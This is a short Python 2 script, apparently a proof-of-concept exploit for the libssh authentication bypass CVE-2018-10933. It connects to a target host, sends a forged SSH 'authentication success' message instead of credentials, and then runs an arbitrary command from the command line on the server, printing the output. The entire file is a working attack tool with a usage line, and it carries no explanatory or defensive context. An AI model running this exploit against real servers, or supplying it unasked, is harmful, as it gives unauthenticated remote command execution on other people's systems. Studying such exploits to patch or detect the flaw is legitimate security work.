#!/usr/bin/env python

import sys
import socket
import paramiko

def main(hostname,port,cmd):

	try:

		s = socket.socket()
		s.connect((str(hostname),int(port)))
		print "Connected to Target"
		msg = paramiko.message.Message()
		msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
		paramiko.util.log_to_file("filename.log")
		trans = paramiko.transport.Transport(s)
		trans.packetizer.REKEY_BYTES = pow(2, 40)
		trans.packetizer.REKEY_PACKETS = pow(2, 40)
		trans.start_client(timeout=5)
		trans._send_message(msg)
		session = trans.open_session(timeout=10)
		print "Executing Command"
		session.exec_command(cmd)
		print "Command Executed successfully!"
		out_file = session.makefile("rb",4096) #you can modify the size of the file
		output = out_file.read()
		print "Output:"
		print output
		out_file.close()
		s.close()
		return 
	except Exception as e:
		print "Some Error Occured"
		print e
		return
	

if __name__ == "__main__":
	try:
		hostname = sys.argv[1]
		port = sys.argv[2]
		cmd = sys.argv[3]
		main(hostname,port,cmd)
	except Exception as e:
		print "Usage: <CVE-2018-10933.py> <hostname> <port> <command>"
		exit()

